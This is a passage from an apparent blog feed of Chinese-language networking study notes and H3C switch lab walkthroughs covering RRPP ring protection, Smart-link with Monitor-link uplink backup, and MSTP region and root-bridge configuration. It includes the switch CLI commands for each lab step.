        <content type="html"><![CDATA[<br /><hr><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/RRPP%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>I</strong>.网络中所有交换机之间的链路配置为 Trunk，放行所有 VLAN</p><p><strong>II</strong>.按照图示配置 RRPP 保护所有 VLAN 数据，Ring1 为主环，Ring2 为子环，其他节点和主从端口如图，控制 VLAN 为 Vlan100</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>I.<strong>网络中所有交换机之间的链路配置为 Trunk，放行所有 VLAN，步骤略</strong></p><p>II.<strong>把所有交换机的相关端口都禁用 stp，步骤略</strong></p><p>III.<strong>配置 RRPP</strong></p><p><em>步骤 1：在 SW4 上配置为 RRPP 主节点，保护 Instance0-32，控制VLAN 为 Vlan100，运行在 Ring1，为主环，G1&#x2F;0&#x2F;2 口为主端口，G1&#x2F;0&#x2F;1 口为副端口</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[SW4]rrpp domain 1</span><br><span class="line">[SW4-rrpp-domain1]protected-vlan reference-instance 0 to 32</span><br><span class="line">[SW4-rrpp-domain1]control-vlan 100</span><br><span class="line">[SW4-rrpp-domain1]ring 1 node-mode master primary-port g1/0/2 secondary-port g1/0/1 level 0    #level 0为主环   1为子环</span><br><span class="line">[SW4-rrpp-domain1]ring 1 enable</span><br><span class="line">[SW4]rrpp enable</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 SW3 上配置为 RRPP Ring1 中的传输节点，和 Ring2 中的辅助边缘节点</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[SW3]rrpp domain 1</span><br><span class="line">[SW3-rrpp-domain1]protected-vlan reference-instance 0 to 32</span><br><span class="line">[SW3-rrpp-domain1]control-vlan 100</span><br><span class="line">[SW3-rrpp-domain1]ring 1 node-mode transit primary-port g1/0/2 secondary-port g1/0/3 level 0</span><br><span class="line">[SW3-rrpp-domain1]ring 2 node-mode assistant-edge edge-port g1/0/1</span><br><span class="line">[SW3-rrpp-domain1]ring 1 enable</span><br><span class="line">[SW3-rrpp-domain1]ring 2 enable</span><br><span class="line">[SW3]rrpp enable</span><br></pre></td></tr></table></figure><p><em>步骤 3：在 SW2 上配置为 RRPP Ring1 中的传输节点，和 Ring2 中的边缘节点</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[SW2]rrpp domain 1</span><br><span class="line">[SW2-rrpp-domain1]protected-vlan reference-instance 0 to 32</span><br><span class="line">[SW2-rrpp-domain1]control-vlan 100</span><br><span class="line">[SW2-rrpp-domain1]ring 1 node-mode transit primary-port g1/0/2 secondary-port g1/0/3 level 0</span><br><span class="line">[SW2-rrpp-domain1]ring 2 node-mode edge edge-port g1/0/1</span><br><span class="line">[SW2-rrpp-domain1]ring 1 enable</span><br><span class="line">[SW2-rrpp-domain1]ring 2 enable</span><br><span class="line">[SW2]rrpp enable</span><br></pre></td></tr></table></figure><p><em>步骤 4：在 SW1 上配置为 RRPP Ring2 的主节点</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[SW1]Rrpp domain 1</span><br><span class="line">[SW1-rrpp-domain1]protected-vlan reference-instance 0 to 32</span><br><span class="line">[SW1-rrpp-domain1]control-vlan 100</span><br><span class="line">[SW1-rrpp-domain1]ring 2 node-mode master primary-port g1/0/2 secondary-port g1/0/1 level 1</span><br><span class="line">[SW1-rrpp-domain1]ring 2 enable</span><br><span class="line">[SW1]rrpp enable</span><br></pre></td></tr></table></figure><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RRPP</title>
      <link href="/posts/21901"/>
      <url>/posts/21901</url>
      
        <content type="html"><![CDATA[<br /><br /><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li><code>快速环网保护协议</code></li><li><code>应用于以太环网的链路层协议</code></li><li><code>H3C、华为私有协议</code></li><li><code>RRPP与STP、Smart-link冲突</code></li></ul><h3 id="相关概念"><a href="#相关概念" class="headerlink" title="相关概念"></a>相关概念</h3><h4 id="RRPP域"><a href="#RRPP域" class="headerlink" title="RRPP域"></a>RRPP域</h4><ul><li><code>共同运行同一个RRPP协议的网络范围</code></li></ul><h4 id="主环"><a href="#主环" class="headerlink" title="主环"></a>主环</h4><ul><li><code>主要环结构</code></li><li><code>主环和子环的健康状态检测都在主环上进行</code></li></ul><h4 id="子环"><a href="#子环" class="headerlink" title="子环"></a>子环</h4><ul><li><code>和主环相连的其他环结构</code></li></ul><h4 id="节点"><a href="#节点" class="headerlink" title="节点"></a>节点</h4><ul><li><p>定义：运行RRPP的交换机</p></li><li><p>分类：</p><ul><li><p>主节点        负责环网的健康状态检测</p></li><li><p>传输节点      除主节点外的 其他节点</p></li><li><p>边缘节点        子环和主环相交的节点</p></li><li><p>辅助边缘节点   子环上和主环相交的另一个节点</p></li></ul></li></ul><h4 id="端口角色"><a href="#端口角色" class="headerlink" title="端口角色"></a>端口角色</h4><p><img src="/images/RRPP/01.jpg"></p><h5 id="主端口"><a href="#主端口" class="headerlink" title="主端口"></a>主端口</h5><ul><li>主节点上的主端口周期性发起Hello报文，默认处于转发状态</li><li>传输节点上的主端口接收或发送Hello报文，处于转发状态</li></ul><h5 id="副端口"><a href="#副端口" class="headerlink" title="副端口"></a>副端口</h5><ul><li>主节点上的副端口通过接受Hello报文来判断环网健康状态，默认处于阻塞状态</li><li>传输节点上的副端口接受或发送Hello报文，处于转发状态</li></ul><h5 id="边缘端口"><a href="#边缘端口" class="headerlink" title="边缘端口"></a>边缘端口</h5><ul><li>边缘节点和辅助边缘节点上连接子环一侧的端口</li></ul><h5 id="公共端口"><a href="#公共端口" class="headerlink" title="公共端口"></a>公共端口</h5><ul><li>边缘节点和辅助边缘节点上连接主环一侧的端口</li></ul><h3 id="工作机制"><a href="#工作机制" class="headerlink" title="工作机制"></a>工作机制</h3><p><em><strong>Polling机制</strong></em></p><ul><li>主节点的主端口周期性发送Hello报文</li><li>传输节点转发该报文</li><li>如副端口能够周期性收到Hello报文，判断为环网正常，超出周期末收到，则判断环网故障</li><li>检测到环网故障，主节点立即开启副端口</li></ul><p><em><strong>链路状态变换通知机制</strong></em></p><ul><li>环网故障后，故障所在节点立即向主节点发起Link-down报文</li><li>主节点收到Link-down报文后，立即开启副端口</li></ul><p><em><strong>子环状态检测机制</strong></em></p><ul><li>子环主节点的主端口周期性发送Hello报文</li><li>Hello报文分别沿主环链路和主环与子环相交的链路转发</li><li>只有子环和主环相交的链路和某一条主环链路同时故障，才会导致子环主节点的副端口无法收到Hello报文，判断为子环故障</li><li>子环故障后，子环主节点立即开启副端口</li><li>该机制会导致多子环环境产生环路</li></ul><p><em><strong>主环上子环协议报文通道状态检测机制</strong></em></p><ul><li>正常情况下，边缘节点周期性沿主环链路和主环与子环相交的链路发送Edge-hello报文，该报文会被辅助边缘节点接收</li><li>当子环和主环相交的链路和某一条主环链路同时故障，辅助边缘节点无法收到Edge-hello报文，立即沿子环链路发送Major-fault报文</li><li>边缘节点收到Major-fault报文后，立即阻塞所有边缘端口</li><li>阻塞完成后，子环主节点开启副端口</li><li>该机制会造成部分设备成为孤岛设备</li></ul><h3 id="环组"><a href="#环组" class="headerlink" title="环组"></a>环组</h3><ul><li>如果有多个子环，每个子环都会在边缘和辅助边缘节点通过收发Edge-hello、Major-fauIt等报文来进行状态检测，增加设备性能负担</li><li>可以在边缘和复杂边缘节点上把多个子环加入到一个环组</li></ul><h3 id="拓扑状态变化"><a href="#拓扑状态变化" class="headerlink" title="拓扑状态变化"></a>拓扑状态变化</h3><ul><li>环网健康时，处于Complete状态</li></ul><h4 id="链路故障"><a href="#链路故障" class="headerlink" title="链路故障"></a>链路故障</h4><ul><li>传输节点链路故障，主节点收到Link-down报文后，切换至Faied状态，并放开副端口;主节点发送Common-Flush-FDB报文刷新其他交换机表项</li><li>如果Link-down报文未被主节点收到，主节点的副端口无法收到Hello报文，同样会切换至Failed状态，并进行后续操作</li></ul><h4 id="链路恢复"><a href="#链路恢复" class="headerlink" title="链路恢复"></a>链路恢复</h4><ul><li>当传输节点链路恢复，传输节点状态切换至Preforwardfing状态，阻塞刚刚恢复的端口</li><li>主节点的副端口收到Hello报文，状态切换至Complete，阻塞副端口</li><li>主节点从主端口发送Complete-Flush-FDB报文</li><li>传输节点收到Complete-Flush—FDB报文后，状态切换到Link-Up状态，放开临时阻塞的端口，并刷新表项</li><li>传输节点中Preforwarding状态下，一定时间内接受不到主节点的Complete-Flush-FDB报文，也可以自动放开阻塞端口</li></ul><h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[h3c]rrpp domain &#x27;domain-id&#x27;#创建RRPP域</span><br><span class="line">[h3c-rrpp-domain1]control-vlan &#x27;vlan-id&#x27;#配置控制VLAN。控制VLAN不能提前创建</span><br><span class="line">[h3c-rrpp-domain1]protected-vlan reference-instance &#x27;instance-list&#x27;#配置保护VLAN</span><br><span class="line">[h3c-rrpp-domain1]ring &#x27;ring-id&#x27; node-mode master primary-port &#x27;port-name&#x27; secondary-port &#x27;port-name&#x27; level &#x27;level&#x27; #配置主节点</span><br><span class="line">[h3c-rrpp-domain1]ring &#x27;ring-id&#x27; node-mode transit primary-port &#x27;port-name&#x27; secondary-port &#x27;port-name&#x27; level &#x27;level&#x27; #配置传输节点</span><br><span class="line">[h3c-rrpp-domain1]ring &#x27;ring-id&#x27; node-mode edge edge-port &#x27;port-name&#x27;#配置边缘节点</span><br><span class="line">[h3c-rrpp-domain1]ring &#x27;ring-id&#x27; node-mode assistant-edge edge-port &#x27;port-name&#x27; #配置辅助边缘节点</span><br><span class="line">[h3c-rrpp-domain1]ring &#x27;ring-id&#x27; enable#使能RRPP环</span><br><span class="line">[h3c]rrpp enable#使能RRPP</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Smart-link实验</title>
      <link href="/posts/a73beb66"/>
      <url>/posts/a73beb66</url>
      
        <content type="html"><![CDATA[<br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/Smart-link%E5%AE%9E%E9%AA%8C/01.jpg" alt="图1-1"></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>I</strong>.网络中有 Vlan10，Vlan20，Vlan30，Vlan40 一共 4 个业务 Vlan，数据可以在所有链路上转发</p><p><strong>II</strong>.在 SW1 上使用 Smart-link 对上行链路进行备份。要求 Smart-link组1 引用 MST 实例 1 （映射 Vlan10 和 Vlan20）的流量经过 SW2 的链路访问上行设备，而 Smart-link 组 2 引用实例 2（映射 Vlan30 和 Vlan40）的流量经过 SW3 的链路访问上行设备，组 1 和组 2 分别在 Vlan100 和 Vlan200 内发送和接收 Flush 报文</p><p><strong>III</strong>.要求当 Smart-link 主链路故障恢复后，端口角色能够自动恢复</p><p><strong>IV</strong>.要求当 SW2 和 SW3 的上行链路故障后，也能触发 Smart-link 角色切换</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p>I.<strong>网络中有 Vlan10，Vlan20，Vlan30，Vlan40 一共 4 个业务 Vlan，数据可以在所有链路上转发</strong></p><p>　　<em>分析：在所有交换机上创建 Vlan10，Vlan20，Vlan30 和 Vlan40，另外由于后面需要配置控制 VLAN，所以还需要创建 Vlan100 和 Vlan200，配置所有互联接口类型为 Trunk，放行所有 Vlan，步骤略</em>　　</p><p>II.<strong>在 SW1 上使用 Smart-link 对上行链路进行备份。要求 Smart-link组1 引用 MST 实例 1 （映射 Vlan10 和 Vlan20）的流量经过 SW2 的链路访问上行设备，而 Smart-link 组 2 引用实例 2（映射 Vlan30 和 Vlan40）的流量经过 SW3 的链路访问上行设备，组 1 和组 2 分别在 Vlan100 和 Vlan200 内发送和接收 Flush 报文</strong></p><p>　　<em>分析：根据需求，得知 Smart-link 组 1 保护 Vlan10 和 Vlan20，Smart-link 组 2 保护 Vlan30 和 Vlan40，由于 Smart-link 通过引用 MST 实例来保护 Vlan，所以首先需要配置 MST 实例，Instance1 映射 Vlan10 和 Vlan20，包括本 Smart-link 组的控制 Vlan，Vlan100；Instance2 映射 Vlan30 和 Vlan40，还有 Vlan200<br>　　Smart-link 组 1 经过 SW2 的链路访问上行设备，所以组 1 中，G1&#x2F;0&#x2F;1 为主端口，G1&#x2F;0&#x2F;2 为从端口，组 2 经过 SW3 的链路访问上行设备，所以组 2 中，G1&#x2F;0&#x2F;2 为从端口，G1&#x2F;0&#x2F;1 为主端口<br>　　组 1 和 组 2 分别在 Vlan100 和 Vlan200 内发送和接收 Flush 报文，所以需要在组 1 中配置控制 VLAN 为 Vlan100，组 2 中配置控制 VLAN 为 Vlan200。同时 ，为了使整个网络都完成迅速切换，SW2，SW3，SW4 都需要在各自的互联接口配置允许在 Vlan100 和 Vlan200 发送和接收 Flash 报文<br>　　由于交换机默认开启了生成树，与 Smart-link 功能冲突，所以需要在相关接口上关闭 STP 特性</em><br>　　<br><em>步骤 1：在 SW1 上配置 MST 域，创建 Instance1 映射 Vlan10、Vlan20 和 Vlan100，Instance2 映射 Vlan30、Vlan40 和 Vlan200，命令略</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[SW1]stp region-configuration</span><br><span class="line">[SW1-mst-region]instance 1 vlan 10 20 100</span><br><span class="line">[SW1-mst-region]instance 2 vlan 30 40 200</span><br><span class="line">[SW1-mst-region]active region-configuration </span><br></pre></td></tr></table></figure><p><em>步骤 2：在 SW1 的 G1&#x2F;0&#x2F;1 和 G1&#x2F;0&#x2F;2 端口上关闭 STP 特性，命令略</em></p><p><em>步骤 3：在 SW1 上创建 Smart-link 组 1，引用实例 1，配置控制 VLAN 为 Vlan100，主端口为 G1&#x2F;0&#x2F;1，从端口为 G1&#x2F;0&#x2F;2</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[SW1]smart-link group 1</span><br><span class="line">[SW1-smlk-group1]protected-vlan reference-instance 1</span><br><span class="line">[SW1-smlk-group1]flush enable control-vlan 100</span><br><span class="line">[SW1-smlk-group1]port g1/0/1 primary</span><br><span class="line">[SW1-smlk-group1]port g1/0/2 secondary</span><br></pre></td></tr></table></figure><p><em>步骤 4：在 SW1 上创建 Smart-link 组 2，引用实例 2，配置控制 VLAN 为 Vlan200，主端口为 G1&#x2F;0&#x2F;2，从端口为 G1&#x2F;0&#x2F;1</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[SW1]smart-link group 2</span><br><span class="line">[SW1-smlk-group2]protected-vlan reference-instance 2</span><br><span class="line">[SW1-smlk-group2]flush enable control-vlan 200</span><br><span class="line">[SW1-smlk-group2]port g1/0/2 primary</span><br><span class="line">[SW1-smlk-group2]port g1/0/1 secondary</span><br></pre></td></tr></table></figure><p><em>步骤 5：在 SW2，SW3，SW4 的互联端口上配置允许在 Vlan100 和 Vlan200 发送接收 Flush 报文</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW2-GigabitEthernet1/0/1]smart-link flush enable control-vlan 100 200</span><br><span class="line">[SW2-GigabitEthernet1/0/2]smart-link flush enable control-vlan 100 200</span><br></pre></td></tr></table></figure><p><em>SW3，SW4 的配置命令与 SW2 一致</em></p><p>　　<em>分析：Smart-link 配置完成后，由于只引用了实例 1 和实例 2，并没有引用 Vlan1 所在的实例 0，实例 0 由 MSTP 的 IST 来进行防环；而 SW1 的相关接口关闭了 STP 特性，导致 SW2、SW3 和 SW4 上的 STP 协议判断没有环路，从而不会阻塞任何端口；而且所有接口都配置为了 Trunk 并默认放行 Vlan1，所以当前网络中 Vlan1 存在逻辑环路<br>　　这里采取把 Vlan1 所在的实例 0 也引用到 Smart-link 组 1 来解决</em><br>　　<br><em>步骤 6：在 Smart-link 组 1 中引用 MST 实例 0</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[SW1-smlk-group1]protected-vlan reference-instance 0</span><br></pre></td></tr></table></figure><p>III.<strong>要求当 Smart-link 主链路故障恢复后，端口角色能够自动恢复</strong></p><p>　　<em>分析：Smart-link 默认不开启角色抢占，如主链路故障恢复后，仍然保持数据从备份链路传输。需要配置开启抢占模式，才能够使端口角色自动恢复</em><br>　　<br><em>步骤 1：在 SW1 的 Smart-link 组 1 和组 2 中分别开启抢占模式</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1-smlk-group1]preemption mode role</span><br><span class="line">[SW1-smlk-group2]preemption mode role</span><br></pre></td></tr></table></figure><p><em>效果测试：关闭 SW1 的 G1&#x2F;0&#x2F;1 口，Smart-link 组 1 会切换 G1&#x2F;0&#x2F;2 口为活跃链路，再次开启 G1&#x2F;0&#x2F;1 口后，活跃链路会重新切换回 G1&#x2F;0&#x2F;1 口</em></p><p>IV.<strong>要求当 SW2 和 SW3 的上行链路故障后，也能触发 Smart-link 角色切换</strong></p><p>　　<em>分析：Smart-link 只监听本机端口状态，当本机主端口故障，才会触发角色切换。根据需求分析，需要在 SW2 和 SW3 上配置 Monitor-link，把连接 SW4 的端口配置为上行端口，连接 SW1 的端口配置为下行端口</em><br>　　<br><em>步骤 1：在 SW2 上创建 Monitor-link 组，配置上行端口为 G1&#x2F;0&#x2F;2，下行端口为 G1&#x2F;0&#x2F;1</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SW2]monitor-link group 1</span><br><span class="line">[SW2-mtlk-group1]port g1/0/2 uplink </span><br><span class="line">[SW2-mtlk-group1]port g1/0/1 downlink</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 SW3 上创建 Monitor-link 组，配置上行端口为 G1&#x2F;0&#x2F;2，下行端口为 G1&#x2F;0&#x2F;1，命令与 SW2 一致</em></p><p><em>效果测试：在 SW2 或 SW3 上关闭 G1&#x2F;0&#x2F;2 口，Monitor-link 会自动关闭 G1&#x2F;0&#x2F;1 口来触发 SW1 的 Smart-link 的角色切换</em></p><br /><br /><blockquote><p>转载于<a href="http://www.dengfm.com/">邓方鸣-在线文档库</a></p><p>转载目的：学习</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 数通实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> H3C实验 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Smart-link</title>
      <link href="/posts/20112"/>
      <url>/posts/20112</url>
      
        <content type="html"><![CDATA[<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><ul><li><code>一种针对双上行组网的解决方案，实现了高效可靠的链路冗余备份和故障快速切换</code></li><li><code>H3C和华为私有协议</code></li></ul><h3 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h3><p><code>故障切换速度可达厘秒级。1000厘秒，即10秒</code></p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h4><ul><li><code>双上行的两个端口组成一个Smart-link组，配置为主端口和副端口</code></li><li><code>主端口链路故障，立即切换为副端口转发数据</code></li></ul><h4 id="保护VLAN"><a href="#保护VLAN" class="headerlink" title="保护VLAN"></a>保护VLAN</h4><ul><li><code>Smart-link组允许转发的VLAN</code></li><li><code>以MST实例的形式进行映射</code></li></ul><h4 id="控制VLAN"><a href="#控制VLAN" class="headerlink" title="控制VLAN"></a>控制VLAN</h4><ul><li><code>FLUSH报文转发的VLAN</code></li></ul><h4 id="FLUSH报文"><a href="#FLUSH报文" class="headerlink" title="FLUSH报文"></a>FLUSH报文</h4><p><em>技术背景</em></p><ul><li><code>链路发生故障切换时，上行交换机学习的MAC地址仍然对应原接口</code></li><li><code>需要通过流量来刷新正确的MAC地址记录</code></li><li><code>刷新期间，流量会中断</code></li></ul><p><em>解决方案</em></p><ul><li><code>链路发生故障切换时，Smart-link从新的链路上发送Flush报文</code></li><li><code>收到Flush报文的交换机，会在接收报文的端口重新学习MAC地址记录</code></li></ul><h4 id="Smart-link角色抢占模式"><a href="#Smart-link角色抢占模式" class="headerlink" title="Smart-link角色抢占模式"></a>Smart-link角色抢占模式</h4><ul><li><code>默认主端口故障恢复后，不会发生角色抢占</code></li><li><code>可通过配置使主端口自动抢占角色</code></li></ul><h4 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h4><ul><li><code>Smart-link、STP、RRPP同时只能运行一种</code></li><li><code>配置Smart-link时，需要在相关接口上关闭STP特性</code></li></ul><h3 id="Monitor-link"><a href="#Monitor-link" class="headerlink" title="Monitor-link"></a>Monitor-link</h3><h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><ul><li><code>用于把上行链路的存活状态同步到下行链路</code></li><li><code>使Smart-link可以感知到跨设备的链路故障</code></li></ul><h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><ul><li><code>上行端口连接上层设备的端口</code></li><li><code>下行端口            连接Smart-link的端口</code></li><li><code>当所有上行端口Down，自动关闭下行端口</code></li><li><code>任意一个上行端口UP，自动开启下行端口</code></li></ul><h3 id="相关命令"><a href="#相关命令" class="headerlink" title="相关命令"></a>相关命令</h3><p><code>[h3c]smart-link group &#39;group-id&#39;#创建Smart-link组</code></p><p><code>[h3c-smlk-group1]protected-vlan reference-instance &#39;instance-list&#39;#配置保护VLAN</code></p><p><code>[h3c-smlk-group1]flush enable control-vlan &#39;vlan-id&#39;    #配置控制VLAN</code></p><p><code>[h3c-smlk-group1]port &#39;port-name&#39; &#39;primary/secondary&#39;#Smart-link视图下配置端口角色</code></p><p><code>[h3c-GigabitEthernet1/0]port  smart-link group &#39;group-id&#39; &#39;primary/secondary&#39;#接口视图下配置端口角色</code></p><p><code>[h3c-smlk-group1]preemption mode role #开启角色抢占</code></p><p><code>[h3c-GigabitEthernet1/0/1]smart-link flush enable control-vlan &#39;vlan-id&#39;#上行交换机配置控制VLAN</code></p><p><code>[h3c]moitor-link group &#39;group-id&#39;   #创建Monitor-link组</code></p><p><code>[h3c-mtlk-group1]port &#39;port-name&#39; &#39;uplink/downlink&#39;#配置端口角色</code></p>]]></content>
      
      
      <categories>
          
          <category> 数通学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数通学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSTP实验</title>
      <link href="/posts/58193"/>
      <url>/posts/58193</url>
      
        <content type="html"><![CDATA[<br /><h3 id="实验拓扑"><a href="#实验拓扑" class="headerlink" title="实验拓扑"></a>实验拓扑</h3><p><img src="/images/MSTP%E5%AE%9E%E9%AA%8C/01.jpg"><em>图1-1</em></p><hr><h3 id="实验需求"><a href="#实验需求" class="headerlink" title="实验需求"></a>实验需求</h3><p><strong>I</strong>.所有交换机上创建 Vlan10，Vlan20，Vlan30 和 Vlan40</p><p><strong>II</strong>.所有交换机之间的端口配置为 Trunk，并放行相关 VLAN</p><p><strong>III</strong>.按照图示分区域配置 MSTP，并配置主备根网桥</p><hr><h3 id="实验解法"><a href="#实验解法" class="headerlink" title="实验解法"></a>实验解法</h3><p><strong>I</strong>.<strong>创建 VLAN 部分略</strong></p><p><strong>II</strong>.<strong>交换机端口配置 Trunk 部分略</strong></p><p><strong>III</strong>.<strong>按照图示分区域配置 MSTP，并配置主备根网桥</strong></p><p>　　<em>分析：根据图示，网络中存在 3 个 MST 区域。交换机属于同一个 MST 区域的必要条件是域名、修订级别、实例和 VLAN 的映射关系一致，所以SW1，SW2，SW3 的配置需要一致，SW4，SW5，SW6 的配置一致，SW7 单独配置<br>　　另外，根据需求，h3c1 区域中的 Instance1 映射 Vlan10 和 Vlan20，Instance2 映射 Vlan30 和 Vlan40；SW1 和 SW2 分别为两个实例的主备根网桥。其他 VLAN 均映射在默认的 Instance0<br>　　h3c2 区域中的 Instance1 映射 Vlan10，Instance2 映射 Vlan20，SW4 和 SW5 分别为两个实例的主备根网桥。其他 VLAN 均映射在默认的 Instance0<br>　　h3c3 区域中的 Instance1 映射 Vlan20，Instance2 映射 Vlan40，SW7 为两个实例的主备根网桥。其他 VLAN 均映射在默认的 Instance0</em><br>　　<br><em>步骤 1：SW1 上配置 MST 域，域名为 h3c1，修订级别为 1，创建 Instance1 映射 Vlan10 和 Vlan20，创建 Instance2 映射 Vlan30 和 Vlan40</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[SW1]stp region-configuration</span><br><span class="line">[SW1-mst-region]region-name h3c1</span><br><span class="line">[SW1-mst-region]revision-level 1</span><br><span class="line">[SW1-mst-region]instance 1 vlan 10 20</span><br><span class="line">[SW1-mst-region]instance 2 vlan 30 40</span><br><span class="line">[SW1-mst-region]active region-configuration</span><br></pre></td></tr></table></figure><p><em>步骤 2：在 SW2，SW3 配置 MST 域，配置方法和命令一致</em></p><p><em>步骤 3：在 SW1 上配置为 Instance1 的主根和 Instance2 的备份根</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW1]stp instance 1 root primary </span><br><span class="line">[SW1]stp instance 2 root secondary</span><br></pre></td></tr></table></figure><p><em>步骤 4：在 SW2 上配置为 Instance1 的备份根和 Instance2 的主根</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW2]stp instance 1 root secondary</span><br><span class="line">[SW2]stp instance 2 root primary </span><br></pre></td></tr></table></figure><p><em>步骤 5：SW4 上配置 MST 域，域名为 h3c2，修订级别为 1，创建 Instance1 映射 Vlan10，创建 Instance2 映射 Vlan30</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[SW4]stp region-configuration</span><br><span class="line">[SW4-mst-region]region-name h3c2</span><br><span class="line">[SW4-mst-region]revision-level 1</span><br><span class="line">[SW4-mst-region]instance 1 vlan 10</span><br><span class="line">[SW4-mst-region]instance 2 vlan 30</span><br><span class="line">[SW4-mst-region]active region-configuration</span><br></pre></td></tr></table></figure><p><em>步骤 6：在 SW5 和 SW6 上配置 MST 域，配置方法和命令与 SW4 一致</em></p><p><em>步骤 7：在 SW4 上配置为 Instance1 的主根和 Instance2 的备份根</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW4]stp instance 1 root primary </span><br><span class="line">[SW4]stp instance 2 root secondary</span><br></pre></td></tr></table></figure><p><em>步骤 8：在 SW6 上配置为 Instance1 的备份根和 Instance2 的主根</em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[SW6]stp instance 1 root secondary</span><br><span class="line">[SW6]stp instance 2 root primary </span><br></pre></td></tr></table></figure><p><em>步骤 9：SW7 上配置 MST 域，域名为 h3c3，修订级别为 1，创建 Instance1 映射 Vlan20，创建 Instance2 映射 Vlan40，由于区域 h3c3 